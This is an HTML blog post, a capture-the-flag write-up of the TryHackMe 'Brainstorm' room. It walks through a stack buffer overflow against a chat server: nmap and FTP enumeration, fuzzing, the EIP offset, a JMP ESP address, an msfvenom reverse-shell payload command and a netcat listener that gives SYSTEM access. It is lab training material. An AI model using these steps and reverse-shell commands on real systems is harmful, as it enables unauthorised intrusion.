@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>ovelny - TryHackMe writeup: Brainstorm</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta
+      name="description"
+      content="ovelny - notes on infosec, penetration testing, programming and others"
+    />
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
+    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
+    <link
+      href="/atom.xml"
+      rel="alternate"
+      title="ovelny"
+      type="application/atom+xml"
+    />
+    <script src="/assets/js/scramble-text.min.js" defer></script>
+    <script src="/assets/js/zoom-images.min.js" defer></script>
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:site" content="@ovelny"/>
+    <meta name="twitter:title" content="ovelny - TryHackMe writeup: Brainstorm"/>
+    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
+    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
+  </head>
+  <body>
+
+    <header>
+      <section>
+        <a href="/">
+          <img
+            class="logo"
+            src="/assets/images/ovelny-pfp.png"
+            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
+          />
+        </a>
+        <h2><a class="ovelny" href="/">ovelny</a></h2>
+      </section>
+      <nav>
+        <a href="/now/">now</a>
+        <a href="/chaos/">chaos</a>
+        <a href="/phasm/">phasm</a>
+        <a href="/support/">support</a>
+        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
+        <a href="/about/">about</a>
+      </nav>
+    </header>
+    <main>
+
+    
+      <h1>TryHackMe writeup: Brainstorm</h1>
+    
+    <p>For a while now, I&#39;ve noticed that I let a lot of writeup drafts pile up without ever publishing them. Usually when I get back to them, I forgot most of what the CTF was about and it becomes nightmarish to publish it.</p>
+
+<p>The solution to this is obvious: just write the entire blog post while doing the CTF! Which is something I&#39;m gonna do for this TryHackMe room.</p>
+
+<p>Brainstorm <em>should be</em> a simple reverse engineering room, as it&#39;s meant to practice basic stack-based buffer overflows. This should be fun and I definitely need that kind of refresher, so let&#39;s begin!</p>
+
+<h2>Enumeration</h2>
+
+<p>As usual, we&#39;re going to scan and enumerate the network as we have to begin somewhere.</p>
+
+<h3>Nmap</h3>
+
+<p>Let&#39;s run the following command, which will allow nmap to scan which services are running with their versions info, run standard scripts, keep scanning even if it doesn&#39;t respond to ping and proceed faster for all of this:</p>
+
+<div class="highlight"><pre class="highlight shell"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> &lt;ip-address&gt;
+</code></pre></div>
+
+<p>This outputs the following results:</p>
+
+<div class="highlight"><pre class="highlight plaintext"><code># Nmap 7.92 scan initiated Thu May 12 15:12:15 2022 as: nmap -sV -sC -T4 -Pn 10.10.106.144
+Nmap scan report for 10.10.106.144
+Host is up (0.031s latency).
+Not shown: 997 filtered tcports (no-response)
+PORT     STATE SERVICE            VERSION
+21/tcp   open  ftp                Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+3389/tcp open  ssl/ms-wbt-server?
+|_ssl-date: 2022-05-12T13:15:30+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=brainstorm
+| Not valid before: 2022-05-11T12:48:05
+|_Not valid after:  2022-11-10T12:48:05
+| rdp-ntlm-info: 
+|   Target_Name: BRAINSTORM
+|   NetBIOS_Domain_Name: BRAINSTORM
+|   NetBIOS_Computer_Name: BRAINSTORM
+|   DNS_Domain_Name: brainstorm
+|   DNS_Computer_Name: brainstorm
+|   Product_Version: 6.1.7601
+|_  System_Time: 2022-05-12T13:15:00+00:00
+9999/tcp open  abyss?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     Welcome to Brainstorm chat (beta)
+|     Please enter your username (max 20 characters): Write a message:
+|   NULL: 
+|     Welcome to Brainstorm chat (beta)
+|_    Please enter your username (max 20 characters):
+&lt;snip&gt;
+</code></pre></div>
+
+<h3>Website or web services</h3>
+
+<p>N/A</p>
+
+<h3>Other services</h3>
+
+<p>N/A</p>
+
+<h2>Relevant findings for exploitation</h2>
+
+<p>Our nmap output already tells us a lot:</p>
+
+<ul>
+<li>We have a FTP server running with anonymous login enabled (nice!).</li>
+<li>We have a RDP port opened that will be useful to us later on.</li>
+<li>We have a custom program running with port 9999 opened, which is most likely going to be our target for reverse engineering in due time.</li>
+</ul>
+
+<h2>Exploitation</h2>
+
+<p>First things first, let&#39;s connect to the FTP server:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_1.jpg" alt="Screenshot showing a connection to the FTP server with anonymous login allowed."></p>
+
+<p>With anonymous login allowed, the credentials simply were anonymous:anonymous@ip-address.</p>
+
+<p>I had some issues at this point with passive FTP mode and EPSV that prevented me to list directories: to disable those, simply run <code>passive</code> and <code>epsv</code>.</p>
+
+<p>Running <code>dir</code>, we can see the following directory:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_2.jpg" alt="Screenshot showing a directory named &quot;chatserver&quot;, listed on the FTP server."></p>
+
+<p>By listing the content in <code>chatserver</code>, we can find a copy of chatserver.exe and its DLL:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_3.jpg" alt="Screenshot showing the content of the &quot;chatserver&quot; directory. Two files are present: chatserver.exe and essfunc.dll."></p>
+
+<p>Great! We can now download the program (and the DLL) to work on our buffer overflow, which we will then use on the real target (chatserver on port 9999).</p>
+
+<div class="highlight"><pre class="highlight shell"><code>ftp&gt; binary
+200 Type <span class="nb">set </span>to I.
+ftp&gt; get chatserver.exe
+<span class="nb">local</span>: chatserver.exe remote: chatserver.exe
+200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+100% |<span class="k">*********</span> &lt;snip&gt;
+226 Transfer complete.
+43747 bytes received <span class="k">in </span>00:00 <span class="o">(</span>264.86 KiB/s<span class="o">)</span>
+ftp&gt; get essfunc.dll
+<span class="nb">local</span>: essfunc.dll remote: essfunc.dll
+200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+100% |<span class="k">*******</span> &lt;snip&gt;
+226 Transfer complete.
+30761 bytes received <span class="k">in </span>00:00 <span class="o">(</span>238.18 KiB/s<span class="o">)</span>
+</code></pre></div>
+
+<p>Quick aside: at this point I knew I had to use Immunity Debugger but couldn&#39;t be bothered setting an entire Windows VM just for this task. Turns out that Immunity Debugger works fine with Wine on Kali! Just make sure to set the env variable <code>winearch</code> to <code>win32</code> when installing it and you&#39;ll be all set.</p>
+
+<p>First things first, let&#39;s see how the program behaves in a regular context. Launching the <code>chatserver.exe</code>, we get a prompt to create a username and we&#39;re then free to send messages away:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_4.jpg" alt="Screenshot showing a netcat connection being initiated on port 9999, used by chatserver.exe. A banner greets us and a prompt to enter our username and write a message appears."></p>
+
+<p>The program outputs the following while listening for a connection and processing our username and messages:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_5.jpg" alt="Chatserver.exe logs screenshot. It outputs a call for its needed DLL, essfunc, then it&#39;s waiting for connections and once one has been established, outputs its address and port and finally the username that has been chosen."></p>
+
+<p>We might trigger a buffer overflow when creating our username or sending a message — or both. Let&#39;s test that. The basic fuzzer that we&#39;re using is the following:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_6.jpg" alt="A quick Python script that does basic fuzzing on the app. It initiates the connection that we initially did manually, and sends an increasingly bigger string of &quot;AAAAA&quot; until chatserver crashes."></p>
+
+<p>We quickly see that username creation implements a character limit so we won&#39;t trigger anything with this input:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_7.jpg" alt="Chatserver logs again, that show our script has been poorly thought out as it doesn&#39;t account for the username creation step, which has a proper character limit and won&#39;t overflow."></p>
+
+<p>While editing the script to enter the username before fuzzing the app, I realized I could make it way simpler. I ended up rewriting it with the following:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_8.jpg" alt="Rewrite of the previous Python script, which includes the username creation step and is much more concise."></p>
+
+<p>Running the script, we notice that the app is crashing after sending 2100 bytes. We now have our starting point to work on the buffer overflow!</p>
+
+<p>To find the EIP offset, we generate a pattern of 2400 bytes and whip up a short exploit script, quite simple like our fuzzing script:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_9.jpg" alt="Another Python script with a payload of 2400 bytes that will help us locate the EIP offset with pattern_offset, a script present in Kali Linux."></p>
+
+<p>Crashing the app, we get the following EIP register value:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_10.jpg" alt="Screenshot of the EIP register value (31704330) as shown in Immunity Debugger."></p>
+
+<p>Which allows us to find the EIP offset:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_11.jpg" alt="Output of pattern_offset script, which deduces that the EIP offset is 2012 given the EIP register value."></p>
+
+<p>By editing our exploit script, we can confirm that the EIP offset is correct:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_12.jpg" alt="Immunity screenshot showing the EIP register value (42424242) after changing our Python script, to make sure that the offset is correct."></p>
+
+<p>Great, smooth sailing ahead of us. What we have to do next is sorting out the badchars and exploit the .dll for privilege escalation. Mona will come in useful for the latter.</p>
+
+<p>Finding the badchars is a simple and boring process: we just add them to our payload and find out what went wrong in our ESP dump.</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_13.jpg" alt="Updated Python script taking the offset we found into account, to inject the badchars properly and sort them out in the next step."></p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_14.jpg" alt="Screenshot of our ESP dump in immunity debugger, showing that we don&#39;t have any badchars except the null byte."></p>
+
+<p>Turns out we don&#39;t have any badchars so we will be able to proceed without excluding them (except of course \x00). Let&#39;s work on the .dll file next.</p>
+
+<h2>Privilege escalation</h2>
+
+<p>First, let&#39;s take a look of the modules with Mona. This is simply done with the <code>!mona modules</code> command in Immunity:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_15.jpg" alt="Output of the &quot;!mona modules&quot; command in Immunity Debugger, showing the .DLLs that chatserver.exe depends on along with their properties."></p>
+
+<p>We can see that <code>essfunc.dll</code> is a perfect candidate for privilege escalation because it has no memory protections whatsoever. If we can find a <code>JMP ESP</code> instruction that we can leverage for our payload, we should be good to go.<br>
+Running <code>msf-nasm_shell</code> on Kali, we can see that the hex instruction for <code>JMP ESP</code> is \xff\xe4:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_16.jpg" alt="Output of msf-nasm_shell, showing the hex instruction for JMP ESP."></p>
+
+<p>To find this instruction in <code>essfunc.dll</code>, Mona will again prove to be useful. Running <code>!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll</code> allow us to get the pointers for the instruction we&#39;re looking for:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_17.jpg" alt="Output of &quot;!mona find&quot; command in Immunity Debugger, showing all the pointers leading to the &quot;\xff\xe4&quot; instruction."></p>
+
+<p>Let&#39;s pick the first one and check if this works. We simply adjust our script with the address and change its endianness to match our win x86 target:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_18.jpg" alt="Python script updated with our JMP ESP instruction address, reversed to match the endianness."></p>
+
+<p>And we put a breakpoint in Immunity for the same address. Running the exploit again, we notice that we have indeed control of the EIP:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_20.jpg" alt="Screenshot of Immunity Debugger showing the value of the EIP register, now set to our JMP ESP instruction address."></p>
+
+<p>We&#39;re now ready to add the payload in our script and test it against the real target. To generate a payload, we use msfvenom with the following parameters to match the corresponding architecture of our target, add only the null byte to our list of badchars and make it play nicely with Python:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_21.jpg" alt="Output of &quot;msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -f python -b &#39;\x00&#39;&quot; on Kali Linux. This generates our payload for a Python script while excluding the null byte."></p>
+
+<p>Our script now looks like this (let&#39;s not forget the NOP sled too) and should hopefully be working:</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_22.jpg" alt="Screenshot of our updated and final Python script, ready to inject msfvenom&#39;s payload."></p>
+
+<p>Let&#39;s set up a netcat listener before running it with <code>nc -lvnp 4444</code>. And sure enough, we end up getting elevated privileges on our target, just as planned!</p>
+
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_23.jpg" alt="Screenshot showing that we got a connection to our target. Running the command &quot;whoami&quot; on Windows outputs &quot;nt authority\system&quot;, proving that we have elevated privileges."></p>
+
+    
+      <p class="support">
+      If you enjoyed this post or found any of my other work helpful, feel free 
+      to support me on my <a href="https://ko-fi.com/ovelny" rel="nofollow">ko-fi</a>. 
+      Any contribution will help me tremendously!
+      </p>
+    
+    </main>
+    <footer id="footer">
+      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
+      <div class="footer-section">「七転び八起き」</div>
+    </footer>
+  </body>
+</html>
+
